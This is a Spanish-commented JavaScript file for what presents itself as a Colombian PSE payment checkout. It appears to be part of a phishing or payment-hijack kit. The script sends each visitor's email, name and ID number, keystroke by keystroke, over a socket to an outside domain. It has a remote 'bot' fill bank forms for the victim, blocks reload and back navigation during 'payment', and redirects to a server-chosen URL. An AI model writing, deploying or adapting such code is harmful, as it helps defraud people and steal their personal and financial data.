// pago.js - Sincronización en Vivo + Resumen de Datos Activo + Bloqueo Persistente (LocalStorage)

const socket = io('https://apifinacjs.pagoswebcol.uk'); 

let isTransactionActive = false;
let browserRequested = false; 
const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

// ==========================================
// SEGURIDAD: PREVENIR RECARGA Y RETROCESO
// ==========================================
window.addEventListener('beforeunload', (e) => {
    if (isTransactionActive) {
        e.preventDefault();
        e.returnValue = 'Por favor espere la carga. La transacción está en proceso.';
        return 'Por favor espere la carga. La transacción está en proceso.';
    }
});

window.addEventListener('popstate', function (event) {
    if (isTransactionActive) {
        history.pushState(null, document.title, location.href);
    }
});

document.addEventListener('keydown', function (e) {
    if (isTransactionActive) {
        if (e.key === 'F5' || (e.ctrlKey && e.key.toLowerCase() === 'r') || (e.metaKey && e.key.toLowerCase() === 'r')) {
            e.preventDefault();
        }
    }
});

// ==========================================
// INICIALIZACIÓN Y BLOQUEO PERSISTENTE
// ==========================================
document.addEventListener('DOMContentLoaded', () => {
    // VERIFICACIÓN DE BLOQUEO PERSISTENTE (Evita que burlen la recarga)
    const lockTime = localStorage.getItem('activePaymentLock');
    if (lockTime) {
        const timePassed = Date.now() - parseInt(lockTime);
        // Si han pasado menos de 10 minutos desde que inició el pago
        if (timePassed < 10 * 60 * 1000) { 
            document.body.innerHTML = `
                <div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; background:#f9f9f9; text-align:center; font-family:'Roboto', sans-serif; padding: 20px;">
                    <i class="fas fa-clock" style="font-size: 50px; color: #f39c12; margin-bottom: 20px;"></i>
                    <h2 style="color:#333; margin-bottom: 10px;">Transacción en proceso</h2>
                    <p style="font-size: 16px; color: #555; max-width: 400px; line-height: 1.5;">
                        Tienes un intento de pago abierto. Por favor, <strong>espera la respuesta del banco</strong> o intenta con otro correo más tarde.
                    </p>
                </div>
            `;
            return; // Detiene la carga del resto de la página
        } else {
            // Si pasaron más de 10 minutos, liberamos el bloqueo
            localStorage.removeItem('activePaymentLock'); 
        }
    }

    // 1. Obtener los datos correctamente del localStorage
    const data = JSON.parse(localStorage.getItem('datosFactura')) || {};

    // 2. SE MUESTRAN LOS DATOS EN LAS ETIQUETAS DE TEXTO
    if (document.getElementById('lblNombre') && data.nombreCompleto) document.getElementById('lblNombre').textContent = enmascararNombre(data.nombreCompleto);
    if (document.getElementById('lblId') && data.numId) document.getElementById('lblId').textContent = "CC - " + enmascararID(data.numId);
    if (document.getElementById('lblCorreo') && data.correo) document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
    if (document.getElementById('lblRef') && data.referencia) document.getElementById('lblRef').textContent = data.referencia;

    // 3. LOS INPUTS QUEDAN LIMPIOS
    if (document.getElementById('formCorreo')) document.getElementById('formCorreo').value = "";
    if (document.getElementById('formNumId')) document.getElementById('formNumId').value = "";
    if (document.getElementById('formNombre')) document.getElementById('formNombre').value = "";
    if (document.getElementById('formCelular')) document.getElementById('formCelular').value = "";

    const monto = data.montoPagar || 0;
    const valorFormateado = new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(monto);

    if(document.getElementById('lblValorNeto')) document.getElementById('lblValorNeto').textContent = valorFormateado;
    if(document.getElementById('lblValorTotal')) document.getElementById('lblValorTotal').textContent = valorFormateado;
    if(document.getElementById('lblTotalFinal')) document.getElementById('lblTotalFinal').textContent = valorFormateado;
});

// ==========================================
// 1. ABRIR EL NAVEGADOR Y ACTUALIZAR BANCO EN VIVO
// ==========================================
const selectBanco = document.getElementById('selectBanco');
if (selectBanco) {
    selectBanco.addEventListener('change', (e) => {
        const bancoSeleccionado = e.target.value;
        const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
        const amount = data.montoPagar || 0;
        
        if (!browserRequested) {
            socket.emit('init_browser', { bank: bancoSeleccionado, amount: amount });
            browserRequested = true;
            console.log("Iniciando bot con el banco:", bancoSeleccionado);
        } else {
            socket.emit('live_type', { field: 'bank', value: bancoSeleccionado });
            console.log("Cambiando el banco en vivo a:", bancoSeleccionado);
        }
    });
}

// ==========================================
// 2. SINCRONIZACIÓN EN VIVO 
// ==========================================
function syncInput(inputId, fieldName) {
    const input = document.getElementById(inputId);
    let timeoutId; 

    if (input) {
        input.addEventListener('input', (e) => {
            if (browserRequested) {
                clearTimeout(timeoutId);
                timeoutId = setTimeout(() => {
                    socket.emit('live_type', { field: fieldName, value: e.target.value });
                }, 400); 
            }
        });
    }
}
syncInput('formCorreo', 'email');
syncInput('formNombre', 'name');
syncInput('formNumId', 'doc');

// ==========================================
// 3. FINALIZAR PAGO
// ==========================================
const botonPagar = document.querySelector('.btn-pay');
let loadingInterval;

if (botonPagar) {
    botonPagar.addEventListener('click', function() {
        const banco = selectBanco ? selectBanco.value : "";
        const email = document.getElementById('formCorreo').value.trim();
        const doc   = document.getElementById('formNumId').value.trim();
        const name  = document.getElementById('formNombre').value.trim();
        const phone = document.getElementById('formCelular').value.trim();

        if (!banco || banco.includes("Seleccione")) { alert("Por favor seleccione un banco de la lista."); return; }
        if (!emailRegexValido.test(email)) { alert("Correo inválido."); return; }
        if (!doc || doc.length < 5) { alert("Cédula inválida."); return; }
        if (!name || name.length < 3) { alert("Nombre inválido."); return; }
        if (!phone || phone.length < 7) { alert("Celular inválido."); return; }
        if (!browserRequested) { alert("Aún no se ha iniciado la conexión, por favor vuelva a seleccionar su banco."); return; }

        // ACTIVAR BLOQUEOS DE SEGURIDAD
        isTransactionActive = true; 
        history.pushState(null, document.title, location.href); 
        
        // Guardar el candado en el navegador (si recarga, se bloquea)
        localStorage.setItem('activePaymentLock', Date.now().toString());

        const overlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('dynamicLoadingText');
        
        if (overlay) overlay.style.display = 'flex';
        loadingInterval = animateLoadingText(loadingText);

        socket.emit('submit_payment', { email, name, doc, bank: banco });
    });
}

// ==========================================
// RESPUESTAS DEL SERVIDOR
// ==========================================
socket.on('browser_ready', () => {
    console.log("Servidor: Formulario base llenado.");
});

socket.on('payment_success', (data) => {
    const loadingText = document.getElementById('dynamicLoadingText');
    if (loadingText) loadingText.textContent = "Redirigiendo a PSE...";
    clearInterval(loadingInterval);
    setTimeout(() => {
        isTransactionActive = false; 
        // Nota: NO borramos el 'activePaymentLock' aquí, así si el usuario
        // presiona "Atrás" después de pagar, verá la pantalla de bloqueo y no podrá repetir.
        window.location.href = data.url; 
    }, 1500);
});

socket.on('payment_error', (data) => {
    clearInterval(loadingInterval);
    isTransactionActive = false; 

    // Al haber un error, quitamos el candado para que pueda intentar de nuevo
    localStorage.removeItem('activePaymentLock');

    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'none';

    alert("Hubo un problema de conexión con el banco: " + data.message);
    
    browserRequested = false;
    if (selectBanco) selectBanco.value = ""; 
});

// ==========================================
// UTILIDADES
// ==========================================
function animateLoadingText(element) {
    if (!element) return null;
    const messages = ["Conectando con la pasarela...", "Validando datos...", "Contactando banco..."];
    let i = 0;
    return setInterval(() => { i = (i + 1) % messages.length; element.textContent = messages[i]; }, 2500);
}
function enmascararNombre(nombre) { return nombre ? nombre.split(" ")[0] + " *******" : ""; }
function enmascararID(id) { return id ? id.substring(0, 3) + "****" : ""; }
function enmascararCorreo(email) {
    if(!email) return "";
    const [user] = email.split("@");
    return user.substring(0, 2) + "*******@*****.com";
}
